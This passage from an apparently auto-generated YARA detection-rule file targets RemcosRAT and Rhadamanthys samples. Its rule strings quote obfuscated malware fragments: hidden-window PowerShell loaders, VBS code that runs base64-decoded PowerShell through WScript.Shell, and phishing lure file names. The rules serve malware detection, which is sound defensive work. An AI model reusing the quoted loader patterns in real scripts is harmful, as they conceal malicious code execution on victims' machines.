      $s4 = "elsaan=Domineri 'eeeneeeE ,et ee.eeeW';$dibbelsaan+=Domineri ' !!E !!B! !C!!!L!!!i!!!e,!!n!!!t';$nordenvind=Domineri 'XXXMXXXo X" ascii /* score: '9.00'*/
      $s5 = "V,V V$ VVu VVNVVVdVVVe VVR.VV)');Summi35 $paatrngt;#Insulting Teglvrkss Czec fremm Opkl totterin StoraIeX ;\"" fullword ascii /* score: '8.00'*/
      $s6 = "(Domineri '.66$666g 66L666O666b666A666L666:6 6r66 i6,6b666s666T 6 r66 i666K  6N666i .6266616660 66=666(6,6T66.E666S666t 66-  6p " ascii /* score: '8.00'*/
      $s7 = "__s___T_._- __p___A___T___h __  __$___O___V___E __r __t___u  _R__ i___n _ g___)');while (!$ribstrikni210) {Summi35 (Domineri 'AA" ascii /* score: '8.00'*/
      $s8 = " 4u 44S44.E444R444- 4.a 44g444E444N 44T';$bitt60=Domineri ' eeheeeteeete epeee: ee/eee/eeeoeeebeeeo eer eepe,elee oee ie,eeeeese" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      all of them
}

rule RemcosRAT_signature__3d1d6889 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_3d1d6889.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3d1d6889d78f16a9a5f912a3e6d2461870ea2ae282a3990146439198cfa20e54"
   strings:
      $s1 = "pgitxreqkaudspaj = pgitxreqkaudspaj & \";$GftsOTSaty = ($GftsOTSaty -replace '%JkQasDfgrTg%', '\" & replace(Popolizio,\"\\\",\"$" wide /* score: '17.00'*/
      $s2 = "pgitxreqkaudspaj = pgitxreqkaudspaj & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s3 = "qckpxhomluaahsjm.Run \"powershell \" & (pgitxreqkaudspaj) , 0, false" fullword wide /* score: '15.00'*/
      $s4 = "Popolizio = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "pgitxreqkaudspaj = pgitxreqkaudspaj & \";$GftsOTSaty = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s6 = "set qckpxhomluaahsjm =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 1000KB and
      all of them
}

rule RemcosRAT_signature__3f870660 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_3f870660.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3f87066067c7938e0fd98e3df375c8052e0b1544c43afd4588fea4ad049e9d77"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv rachi;function Dhotysned ($carretavac){ $fantasi=3;do {$plott232+=$carretavac[$fantasi" ascii /* score: '36.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv rachi;function Dhotysned ($carretavac){ $fantasi=3;do {$plott232+=$carretavac[$fantasi" ascii /* score: '23.00'*/
      $s3 = "6L666i666E666n 6.t';$refl=Dhotysned 'TTTMTTTo TTzTTTiTT l.TTl TTaTT /';$mellem=Dhotysned '%%%%%%T%%%%%%l%%%%%%s%%%%%%1%%%%%%2';$" ascii /* score: '14.00'*/
      $s4 = "$kobbe) {Socialmin (Dhotysned ' //$///g///l///o/ /b //a///l ./: //G///a //s //t/,/r,//=///$///c///o //i///l///a///b///i ./l') ;S" ascii /* score: '12.00'*/
      $s5 = "ZZlZZZOZZ b.ZZaZ.ZL ZZ:ZZ LZZZiZZ C ZZhZZZEZZZs Z  ZZZ=ZZZ Z.ZGZZZE ZZTZZ -ZZ C ZZoZ,ZNZZZtZZZEZZZnZZ,TZZ  ZZZ$ZZZVZZZEZZZMZZ oZ" ascii /* score: '8.00'*/
      $s6 = "ocialmin $clockfr;Socialmin (Dhotysned '+++[ ++T+++h ++R ++e+++A+++D+++i+ +N++.g+++.+++t+.+h ++R+++e++,A+++d+++]++ :  +:+++s ++L" ascii /* score: '8.00'*/
      $s7 = "e+++, ++$ ++v+++e ++m+++o++ d+++s+++s+ +u+++k+++k+++)';$vemodssukk=$positi;Socialmin (Dhotysned '{{ ${{.g{,{L{{{o {{b {{A{{{l{{ " ascii /* score: '8.00'*/
      $s8 = "+++e+ +E ++p+++(+,+4+.+0+++0+++0 ,+)');Socialmin (Dhotysned ';;;$ ;;g;;;l;;;O;.;b ;;A;;;l;;;:;;;K;;;o;;;B;;;b;;;E;;;= ;;(;;;t;;;" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__5cb34177 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_5cb34177.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5cb34177d0289e9737e5a261b8d1aac227656b96c768f789d6fcc9bc20adb05e"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv exergonic;function Lotusblo ($fremhvels){ $prci=3;do {$aaenaand+=$fremhvels[$prci];$pr" ascii /* score: '37.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv exergonic;function Lotusblo ($fremhvels){ $prci=3;do {$aaenaand+=$fremhvels[$prci];$pr" ascii /* score: '27.00'*/
      $s3 = "222a222f22" ascii /* score: '17.00'*/ /* hex encoded string '"*"/"' */
      $s4 = "NGGGTGGGEGG.  ,G=G G .GGG GGeGGGt GG- GGCGGGO,GGnGGGTG,Ge GGnGGGTGGG GGG$GGGu GGN GGAGG,aGGGdGGGe');Garrots (Lotusblo 'YYY$Y YgY" ascii /* score: '11.00'*/
      $s5 = "YYlYYYo YYbYYYaYYYlYYY:,YYDYYYiYY fYYYf.YYeYYYrYYYeY.YnYYYt YY  YY=  Y  YY[.YYSYYYyYY s ,YtYYYeY.YmY Y.YYYCY.YoYYYnYYYvYYYe Y rY" ascii /* score: '10.00'*/
      $s6 = "KKAKKKnK Kf KKlKKKyK.KV KKeKKKNKKK)');Garrots $srgmuntre;#RowthsIEXrto Stilret Pana Post Hero tilb Tornsk Wanting ;\"" fullword ascii /* score: '9.00'*/
      $s7 = "eeaeeeR eeCeeeheeeF.eeoeeeu  en eed e 1 ee9eee2  e=eee(eeetee,ee eseeeTeee- eep eeAeeeteeeheee e,e$eeeUeeeN,eeAeeeAeeeDeeeeeee)'" ascii /* score: '8.00'*/
      $s8 = " 0VVV1VVV0VVV0VVV1VVV0 ,V1V.V VV F VViVVVrVVVe VVfVVVoVVVx VV/VV 1 VV4VV 1 VV.VVV0';$data=Lotusblo '}} U }}s}}}e }}R}}}- }}a.}}G" ascii /* score: '8.00'*/
      $s9 = " L}}}:}}}f}}}o } R}}}e }}G.}}+ }}+ }}%%}}}$}}}s}}}t }}A }}L}}}W }.o }}r}}}t}}}H},}n}}}.}}}c}}}o,}}U }}N } t') ;$stridsuniv=$stal" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__6c660b55 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6c660b55.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c660b556e86b30e14d3960103155987ab12ee91a23b8f4338c3fcde19961295"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv papegjenbe;function Laeser ($hirelessmo){ $landbrugs=3;do {$hsblsend+=$hirelessmo[$lan" ascii /* score: '37.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv papegjenbe;function Laeser ($hirelessmo){ $landbrugs=3;do {$hsblsend+=$hirelessmo[$lan" ascii /* score: '27.00'*/
      $s3 = "} }p}}}P}}}d},}a}}}t}}}a}} +  }$}}}C }}h}}}L}}}O }}r} }d');Privilege (Laeser 'ooo$ooogoooLoooooooB ooa oolooo: .obo oI ooT o roo" ascii /* score: '14.00'*/
      $s4 = "YY(  YTY,YE YYSY,Yt YY- YYpYYYaY YtY YhYYY Y.Y$  YVYYYEYYYSYYYt,YYiYYYBYYY)') ;Privilege (Laeser ' o $ooogoooL.ooO ooBo oaoool,o" ascii /* score: '14.00'*/
      $s5 = "rototekni=Laeser 'l l$l,lal lr llcllla  ldlll.lll$ l c llol.lull nll,t llell rlllb l llll.lllI llnl lvlllolllk llelll(lll$lllpll" ascii /* score: '12.00'*/
      $s6 = "NNL NN:NNNUN NN NNCNNNONNNMNNN  NN=N.N NNNGNNNEN NTNNN- NNCNNNoNNNnNNNT N,E NNNN NTNNN NNN$NNNVNNNeNNNsN.NT NNINNNB');Privilege " ascii /* score: '11.00'*/
      $s7 = ")');Privilege $diazoicf;#Zootheisti KoumiseiEX Massepro ;\"" fullword ascii /* score: '11.00'*/
      $s8 = "brugs];$landbrugs+=4;$uddannel=Compare-Object eksamin analysem}until (!$hirelessmo[$landbrugs])$hsblsend}function Privilege ($kv" ascii /* score: '10.00'*/
      $s9 = "chlord='\\Eksponerin.Srs';Privilege (Laeser '},}$}}.g}},l}}}O}}}B}}}a }}L}}}:,}}Y}}}A }}K },o}}}6.}}4}}}= }}$ }}e}} N}}}V}} : }}" ascii /* score: '10.00'*/
      $s10 = "pWp p- ppopppbp pj ,pE p.C ,ptppp   pspppypppspppTpp.epppmppp.ppp$ ppLp.pYp,pm pppppphpp ApppDpppEp.pn');Privilege ($fyrlaminat)" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__822c41be {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_822c41be.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "822c41be0a89edd7e6b1ae8ab85b17d16717864d48d494bb1bb7f92348dbe575"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Grous ($nedjus){ $perl=3;do {$diamo+=$nedjus[$perl];$vola=Compare-Obje" ascii /* score: '35.00'*/
      $x2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Grous ($nedjus){ $perl=3;do {$diamo+=$nedjus[$perl];$vola=Compare-Obje" ascii /* score: '35.00'*/
      $s3 = "llB llAl lL ll:l.lC lloll NlllTlllR llAlll=.ll$ll El lnll.vll.:ll.Al lP llp l.DlllalllTlllA ll+lll$ llal lslllslllAlllYlllelllrl" ascii /* score: '16.00'*/
      $s4 = "EETEEEREE aEEEtEEEhEEEv EEIEE =E E(EEEt.EEE EEsEEEt E -EEEpEE aEEET EEHE.E EEE$ E KEEEAEEEfEEEfEE E EE)') ;Overdri (Grous 'jjj$j" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__aa9670d3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_aa9670d3.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa9670d36c59f7d9c685cc4b1190f1fd46122b374340949967c4f07ad4cba0a6"
   strings:
      $s1 = "LOGrm)9xF?+s" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 2000KB and
      all of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__c0aa6362 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_c0aa6362.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0aa63620a1c4f2802976720db29f0afd8b2a08b0a48ac0710365bde6837eb9a"
   strings:
      $s1 = "bole32.dll" fullword ascii /* score: '23.00'*/
      $s2 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s3 = "YYXZYXXZX" fullword ascii /* base64 encoded string 'avX]vW' */ /* score: '16.50'*/
      $s4 = "YZZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZZY' */ /* score: '16.50'*/
      $s5 = "YXZYZXZYZ" fullword ascii /* base64 encoded string 'avXevX' */ /* score: '16.50'*/
      $s6 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s7 = "YZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZY' */ /* score: '13.50'*/
      $s8 = "XXXXYX" fullword ascii /* reversed goodware string 'XYXXXX' */ /* score: '13.50'*/
      $s9 = "]~bp0C* " fullword ascii /* score: '10.00'*/
      $s10 = "YZXYYYYXXZYX" fullword ascii /* score: '9.50'*/
      $s11 = "ZYYYYYY" fullword ascii /* score: '9.50'*/
      $s12 = "YYYYZXY" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYZZXY" fullword ascii /* score: '9.50'*/
      $s14 = "ZXYYYYZZXZZ" fullword ascii /* score: '9.50'*/
      $s15 = "ftPMh,;" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__3c08a809 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_3c08a809.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3c08a809156756e68bd0574e79a21bd4644d1f632bce529f1f7bce43ac05e978"
   strings:
      $s1 = "qtcreator.exe" fullword wide /* score: '22.00'*/
      $s2 = "XZXZXZXZZ" fullword ascii /* base64 encoded string 'evWevY' */ /* score: '16.50'*/
      $s3 = "XXYXYY" fullword ascii /* reversed goodware string 'YYXYXX' */ /* score: '13.50'*/
      $s4 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s5 = "FKolRj.Kol." fullword ascii /* score: '10.00'*/
      $s6 = "YYYYXXZZXXZ" fullword ascii /* score: '9.50'*/
      $s7 = "YXZYYYYX" fullword ascii /* score: '9.50'*/
      $s8 = "XZYYYYZZ" fullword ascii /* score: '9.50'*/
      $s9 = "ZZZYYYY" fullword ascii /* score: '9.50'*/
      $s10 = "ZZZYXXYYYYX" fullword ascii /* score: '9.50'*/
      $s11 = "ZXYYYYYX" fullword ascii /* score: '9.50'*/
      $s12 = "AYZYYYYZX" fullword ascii /* score: '9.50'*/
      $s13 = "The Qt Company Ltd." fullword wide /* score: '9.00'*/
      $s14 = "* @ ANu" fullword ascii /* score: '9.00'*/
      $s15 = "* %AZfA" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule RemcosRAT_signature__b845f079 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b845f079.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b845f07952a9e0ba15c8e3e3098c9a0f5bc28cf9449e31040289cc5e63f58595"
   strings:
      $s1 = "execute(\"\" & miftryurwxiphjvc & \".Run \"\"powershell.exe \" & vpnvfsisaahlkgqp & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & miftryurwxiphjvc & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "Cvfrgbhj.Run Oliportfv, lUato , TAiHD" fullword wide /* score: '16.00'*/
      $s4 = "TnOj = Cvfrgbhj.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s5 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s6 = "Cvfrgbhj.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set Cvfrgbhj = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "vpnvfsisaahlkgqp = vpnvfsisaahlkgqp & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "vpnvfsisaahlkgqp = vpnvfsisaahlkgqp & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "vpnvfsisaahlkgqp = vpnvfsisaahlkgqp & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "vpnvfsisaahlkgqp = vpnvfsisaahlkgqp & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & SAbles & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "vpnvfsisaahlkgqp = vpnvfsisaahlkgqp & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__c62e04f8 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_c62e04f8.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c62e04f87c433c259d9dbcafecbc70a782ff4fbefd62d270239d7998363262fc"
   strings:
      $s1 = "execute(\"\" & mbiepegjvytvtwws & \".Run \"\"powershell.exe \" & nsuaynfutnmvuedo & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & mbiepegjvytvtwws & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "Cvfrgbhj.Run Oliportfv, lUato , TAiHD" fullword wide /* score: '16.00'*/
      $s4 = "TnOj = Cvfrgbhj.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s5 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s6 = "Cvfrgbhj.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set Cvfrgbhj = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "nsuaynfutnmvuedo = nsuaynfutnmvuedo & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "nsuaynfutnmvuedo = nsuaynfutnmvuedo & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "nsuaynfutnmvuedo = nsuaynfutnmvuedo & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "nsuaynfutnmvuedo = nsuaynfutnmvuedo & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & SAbles & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "nsuaynfutnmvuedo = nsuaynfutnmvuedo & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__c11145fc {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_c11145fc.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c11145fcdacedd7cff374e87b887a3f74f291c728b49fc5789cb9b665b399faf"
   strings:
      $s1 = "Bestellung zum Kauf  Ref PO.EG11029110_QTY.vbs" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__f7df0c8a {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f7df0c8a.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7df0c8aa284e2f3c90989664917f581e65c2436acaaf989b7f50a62ee213178"
   strings:
      $s1 = "Pedido de compra  Ref PO.EG11029110_QTY.vbs" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__fe13cd60 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_fe13cd60.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fe13cd606f49554118fbd63b450f22f81793fa9b2a37eefefac9c006b50a43e2"
   strings:
      $s1 = "8(3)deutschebnksrcswiftmt199058058625200909[780-0742].scr" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__d589a0e9 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_d589a0e9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d589a0e9f5da14db597540dca8f91d852ddc9a23749a49e1a607ba112a692ae7"
   strings:
      $s1 = "61,56,52,61,58,52,61,59,52,60,60,52,62,58,52,57,59,52,57,57,58,52,57,57,60,52,57,57,59,52,57,57,65,52,57,56,63,52,62,60,52,60,59" ascii /* score: '9.00'*/ /* hex encoded string 'aVRaXRaYR``RbXRWYRWWXRWW`RWWYRWWeRWVcRb`R`Y' */
      $s2 = "52,65,64,63,61,52,57,56,56,60,56,52,65,63,56,59,52,64,64,63,58,52,65,64,59,65,52,57,56,56,56,62,52,64,61,65,61,52,57,56,57,61,57" ascii /* score: '9.00'*/ /* hex encoded string 'RedcaRWVV`VRecVYRddcXRedYeRWVVVbRdaeaRWVWaW' */
      $s3 = "52,57,58,62,52,57,59,52,57,57,57,52,57,56,60,52,57,57,59,52,57,56,62,52,57,57,65,52,57,56,63,52,62,60,52,57,57,63,52,57,56,60,52" ascii /* score: '9.00'*/ /* hex encoded string 'RWXbRWYRWWWRWV`RWWYRWVbRWWeRWVcRb`RWWcRWV`R' */
      $s4 = "57,65,52,64,62,56,60,52,64,63,60,65,52,57,64,60,52,65,65,65,62,52,65,63,64,65,52,65,64,64,58,52,65,63,56,59,52,65,62,65,57,52,64" ascii /* score: '9.00'*/ /* hex encoded string 'WeRdbV`Rdc`eRWd`ReeebRecdeReddXRecVYRebeWRd' */
      $s5 = "57,57,65,52,57,56,58,52,57,56,63,52,60,65,52,57,56,64,52,57,57,59,52,57,56,59,52,57,56,60,52,57,58,59,52,60,62,52,57,57,58,52,57" ascii /* score: '9.00'*/ /* hex encoded string 'WWeRWVXRWVcR`eRWVdRWWYRWVYRWV`RWXYR`bRWWXRW' */
      $s6 = "64,64,56,64,52,64,64,62,65,52,64,63,59,63,52,57,56,56,60,62,52,57,58,60,65,61,52,64,61,65,61,52,61,56,64,64,62,52,64,61,65,64,52" ascii /* score: '9.00'*/ /* hex encoded string 'ddVdRddbeRdcYcRWVV`bRWX`eaRdaeaRaVddbRdaedR' */
      $s7 = "62,56,60,52,57,56,56,61,61,52,57,56,57,60,61,52,65,62,65,56,52,65,63,59,60,52,65,64,65,56,52,57,56,57,60,62,52,65,62,59,62,52,65" ascii /* score: '9.00'*/ /* hex encoded string 'bV`RWVVaaRWVW`aRebeVRecY`RedeVRWVW`bRebYbRe' */
      $s8 = "63,52,64,64,62,57,52,57,56,56,56,63,52,57,56,57,59,61,52,64,64,62,60,52,57,56,56,59,58,52,57,56,56,60,59,52,65,62,63,59,52,65,63" ascii /* score: '9.00'*/ /* hex encoded string 'cRddbWRWVVVcRWVWYaRddb`RWVVYXRWVV`YRebcYRec' */
      $s9 = "52,57,56,60,52,57,57,64,52,57,57,64,52,59,61,52,60,62,52,62,60,52,59,61,52,60,58,52,59,59,63,61,52,59,60,57,63,52,59,63,63,61,52" ascii /* score: '9.00'*/ /* hex encoded string 'RWV`RWWdRWWdRYaR`bRb`RYaR`XRYYcaRY`WcRYccaR' */
      $s10 = "52,65,63,59,60,52,57,58,60,63,60,52,65,64,59,56,52,57,56,57,62,57,52,57,56,57,60,60,52,57,64,61,52,65,62,63,59,52,65,63,56,57,52" ascii /* score: '9.00'*/ /* hex encoded string 'RecY`RWX`c`RedYVRWVWbWRWVW``RWdaRebcYRecVWR' */
      $s11 = "63,63,65,52,64,64,63,57,52,64,64,63,62,52,64,63,60,64,52,57,56,57,60,62,52,65,63,56,60,52,65,62,65,52,57,56,57,61,59,52,65,63,62" ascii /* score: '9.00'*/ /* hex encoded string 'cceRddcWRddcbRdc`dRWVW`bRecV`RebeRWVWaYRecb' */
      $s12 = "64,62,62,52,64,62,56,60,52,64,61,65,64,52,65,63,56,58,52,57,56,57,60,59,52,65,63,56,56,52,65,63,56,59,52,57,56,56,60,58,52,57,58" ascii /* score: '9.00'*/ /* hex encoded string 'dbbRdbV`RdaedRecVXRWVW`YRecVVRecVYRWVV`XRWX' */
      $s13 = "64,64,62,61,52,65,63,61,63,52,57,56,57,60,59,52,65,65,65,61,52,65,63,59,63,52,64,64,62,57,52,64,64,62,60,52,65,64,65,56,52,57,58" ascii /* score: '9.00'*/ /* hex encoded string 'ddbaRecacRWVW`YReeeaRecYcRddbWRddb`RedeVRWX' */
      $s14 = "57,59,52,61,56,52,61,56,52,59,61,52,65,64,59,63,52,65,64,64,58,52,65,64,65,60,52,65,63,59,60,52,57,63,58,52,57,56,57,60,60,52,57" ascii /* score: '9.00'*/ /* hex encoded string 'WYRaVRaVRYaRedYcReddXRede`RecY`RWcXRWVW``RW' */
      $s15 = "65,56,56,52,57,56,56,60,61,52,65,62,63,60,52,57,56,56,61,61,52,64,64,56,64,52,65,64,64,64,52,65,60,65,52,57,56,56,56,62,52,64,64" ascii /* score: '9.00'*/ /* hex encoded string 'eVVRWVV`aRebc`RWVVaaRddVdRedddRe`eRWVVVbRdd' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule RemcosRAT_signature__e9ec7f5d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_e9ec7f5d.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e9ec7f5ddf07fff11b3001b613d002fc06d98ea9fac2f80b2f055d431238073a"
   strings:
      $s1 = "9991.exe" fullword ascii /* score: '19.00'*/
      $s2 = "BINtzQFr4" fullword ascii /* score: '8.00'*/
      $s3 = "kEyyvj5" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__fd7efbd3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_fd7efbd3.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd7efbd3bad1830b0b43cb2dba3a21e67f1794cccc6df4b1b55d6a31c5c1895a"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"spsv sunrisingc;function Nonrepe128 ($monondsbnin){ $mono=3;do {$influ+=$monondsbnin[$mono]" ascii /* score: '27.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv sunrisingc;function Nonrepe128 ($monondsbnin){ $mono=3;do {$influ+=$monondsbnin[$mono]" ascii /* score: '27.00'*/
      $s3 = "* g **E***t***-***C***o**,N***T***E **n **T***  * $,**s* *U***l***a***M **I***t***h***e');stors (Nonrepe128 'yy $yyygy.ylyyyoyyy" ascii /* score: '12.00'*/
      $s4 = "a;;;G;;;E;;,N; ;T';$tomats=Nonrepe128 '/./h /,t///t/ /p///s //: ///,//////p// e,//r///s///t  /o //r //p///.//.t //o///p//// //S," ascii /* score: '12.00'*/
      $s5 = "JJnJJJeJJJw  J- JJO J.bJJJjJ,JeJJJC J TJ J J Js JJYJJJS JJTJJ.E ,Jm JJ.JJJ$,JJfJJJOJJJL.JJKJ JeJJJpJJ,6JJJ6');stors ($varifor);s" ascii /* score: '11.00'*/
      $s6 = "//p/,/r /.o///g///f///o / r// s///././c ,/u/ /r';$cixiid=Nonrepe128 '###>';$favelli=Nonrepe128 'OOOi  OEOO x';$tingsv='nann';$no" ascii /* score: '8.00'*/
      $s7 = "ors (Nonrepe128 '333$333G33 L 33o33 B3,3A 33L333: 33U3 3r333e 33c3 3h33.i333=33.(333t333E333S333t33,- 33p3,3A 3 T33 h3 3  33$333" ascii /* score: '8.00'*/
      $s8 = "opi)}$folkep66=Nonrepe128 ' VVn V EVVVtVVV. V.W';$folkep66+=Nonrepe128 '  ZEZZZB,ZZc ZZlZZZiZZZe Z,N ZZt';$stutt=Nonrepe128 '+ +" ascii /* score: '8.00'*/
      $s9 = "***0 **1**.0 **0***1 ,*0***1***  *.F***i***r***e  *f * o **x***/*.*1***4***1 **. **0';$freme=Nonrepe128 '; ;u;;;S; ;e;;;r; ;- ;;" ascii /* score: '8.00'*/
      $s10 = "SSSIS,S=  S(SSStS SeSSSSS ST S -SSSpS SAS,StSS,HSSS .SS$SS sSS USS.LSSSA SSm SSISSStSSSH ,SESSS)');while (!$urechi) {stors (Nonr" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      all of them
}

rule RemcosRAT_signature__fea17b67 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_fea17b67.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fea17b67e04a88bf2262041ef052514f2bbaf0d059c503736d3fb7058835ae19"
   strings:
      $x1 = "::vIp6HuqCauW3b3GQw1tUdJRB+AgWL+8zeTcyMCz2yy18d0CJN4Dq6kZ2TwDJ4E6xCaP/CPdWnht6HA1m7lfj1PFcLgvHTyWIkKKwShbvjy1FtQhkHskxJ+5AhxkifB" ascii /* score: '58.00'*/
